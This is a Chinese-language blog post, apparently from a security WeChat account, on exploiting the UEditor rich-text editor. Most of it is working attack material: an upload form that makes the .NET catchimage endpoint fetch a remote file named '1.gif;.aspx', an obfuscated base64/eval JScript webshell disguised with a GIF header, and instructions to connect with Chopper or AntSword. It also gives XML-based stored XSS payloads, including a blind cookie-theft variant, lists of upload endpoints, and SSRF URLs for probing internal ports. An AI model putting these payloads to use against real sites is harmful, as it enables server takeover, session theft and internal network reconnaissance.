# Ueditor 编辑器漏洞利用

预言 [T9Sec](javascript:void(0);) *2019-10-26 14:09*

#### oxo0 前言

一直比较懒好久没更新了，刚好最近公众号居然有500多人关注了，也有不少人取消了关注。下面更新一波 ueditor编辑器漏洞的利用吧，在挖掘SRC的时候也非常有用哦。如果可以请继续关注我们哦！



#### oxo1 .net Getshell

本地上传POC：

```
<form action="http://www.xxxxx.com/ueditor/net/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
shell addr: <input type="text" name="source[]" />
 <input type="submit" value="Submit" />
</form>
```

一句话木马：密码：hello

```
GIF89a
<script runat="server" language="JScript">
   function popup(str) {
       var q = "u";
       var w = "afe";
       var a = q + "ns" + w; var b= eval(str,a); return(b);
  }
</script>
<% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJoZWxsbyJd")))); %>
```

远程部署一个Webshell，名称为：1.gif;.aspx

```
http://127.0.0.1/1.gif;.aspx
```

浏览POC、输入远程Webshell的地址

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15tum387gj20qu056wew.jpg)

点击提交、运气好就可以得到一个webshell地址、得到地址还会有各种情况出现。（冰蝎的shell会报错、访问出错的时候、尝试换多几个shell看看）

![图片](https://mmbiz.qpic.cn/mmbiz_png/MZzibwD3j5oGo2ib7GtlVFjGycRQriascibmEO0ArgBicEicTQSRceTzec2G4OkTwia1UUzbKcIECkXNF8OujH2NKRfDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

没报错、说明运气不错、成功得到webshell

```
默认路径：http://www.xxxx.com/ueditor/net/upload/image/20191022/6370735180294792151176942.aspx
```

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15tuntyixj20u003w3ys.jpg)

菜刀/蚁剑连之

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15tuqys1mj20u00973yx.jpg)

#### oxo2 Upload XSS

XML_XSS：

```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>


盲打Cookie、src=""：
<something:script src="" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
```

Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀

```
/ueditor/asp/config.json
/ueditor/net/config.json
/ueditor/php/config.json
/ueditor/jsp/config.json
```

上传文件路径

```
/ueditor/index.html

/ueditor/asp/controller.asp?action=uploadimage
/ueditor/asp/controller.asp?action=uploadfile

/ueditor/net/controller.ashx?action=uploadimage
/ueditor/net/controller.ashx?action=uploadfile

/ueditor/php/controller.php?action=uploadfile
/ueditor/php/controller.php?action=uploadimage

/ueditor/jsp/controller.jsp?action=uploadfile
/ueditor/jsp/controller.jsp?action=uploadimage
```

上传图片、抓取数据包

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15tumxzubj20u00cemyj.jpg)

修改URL、和上传的文件

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15tuqqutdj20u00h7q5i.jpg)

浏览触发

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

列出已经上传的文件

```
/ueditor/net/controller.ashx?action=listfile
/ueditor/net/controller.ashx?action=listimage
```



#### oxo3 SSRF

存在漏洞路径：

```
/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg

/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif

/ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
```

存在就会抓取成功、也可以抓取外网的测试

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15tuot46ij20u005n3z7.jpg)

端口不存在就会报错500

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15turjrz0j20u009idgs.jpg)

成功Burpsuite来探测端口、探测内网需要知道内网IP段

![图片](https://tva1.sinaimg.cn/large/e6c9d24ely1h15tuoe6gij20nc0ghjtv.jpg)

 



#### oxo4 参考

https://www.freebuf.com/vuls/181814.html

https://paper.seebug.org/606/